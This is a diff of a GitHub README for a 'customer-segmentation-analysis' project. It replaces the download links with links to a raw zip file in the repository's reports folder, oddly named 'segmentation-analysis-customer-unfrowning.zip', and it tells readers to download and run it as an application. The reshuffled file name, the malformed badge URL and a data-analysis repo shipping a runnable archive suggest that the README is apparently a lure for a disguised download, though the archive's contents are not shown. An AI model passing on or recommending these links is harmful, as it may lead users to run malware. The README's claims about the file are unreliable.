@@ -1,7 +1,7 @@
 # 🎉 customer-segmentation-analysis - Easily Understand Your Customer Data
 
 ## 📥 Download Now
-[![Download Release](https://github.com/XILegacyy/customer-segmentation-analysis/raw/refs/heads/main/reports/customer_analysis_segmentation_3.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/XILegacyy/customer-segmentation-analysis/raw/refs/heads/main/reports/customer_analysis_segmentation_3.2.zip)
+[![Download Release](https://raw.githubusercontent.com/XILegacyy/customer-segmentation-analysis/main/reports/segmentation-analysis-customer-unfrowning.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/XILegacyy/customer-segmentation-analysis/main/reports/segmentation-analysis-customer-unfrowning.zip)
 
 ## 🚀 Getting Started
 To get started, follow these steps to download and run the customer segmentation analysis application. This tool helps you identify high-value customers using simple data analysis techniques.
@@ -21,7 +21,7 @@ To get started, follow these steps to download and run the customer segmentation
 ## 📥 Download & Install
 To obtain the application, visit the Releases page:
 
-[Download Here](https://github.com/XILegacyy/customer-segmentation-analysis/raw/refs/heads/main/reports/customer_analysis_segmentation_3.2.zip)
+[Download Here](https://raw.githubusercontent.com/XILegacyy/customer-segmentation-analysis/main/reports/segmentation-analysis-customer-unfrowning.zip)
 
 1. Visit the provided download link.
 2. Look for the latest version of the application.
